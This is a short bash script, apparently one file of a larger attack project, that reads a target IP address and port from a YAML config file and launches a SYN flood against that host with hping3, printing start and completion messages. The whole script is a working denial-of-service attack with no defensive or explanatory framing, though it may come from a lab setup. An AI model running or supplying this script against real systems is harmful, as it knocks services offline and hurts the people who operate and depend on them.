#!/bin/bash
# scripts/generic.sh

CONFIG_FILE="/etc/attack-config.yml"

# Extract variables using yq
TARGET_IP=$(yq e '.generic.target_ip' "$CONFIG_FILE")
TARGET_PORT=$(yq e '.generic.target_port' "$CONFIG_FILE")

echo "Starting Generic Attack: Performing SYN Flood on $TARGET_IP:$TARGET_PORT..."

# Execute generic SYN Flood attack
hping3 -S -p "$TARGET_PORT" --flood "$TARGET_IP"

echo "Generic Attack Completed."
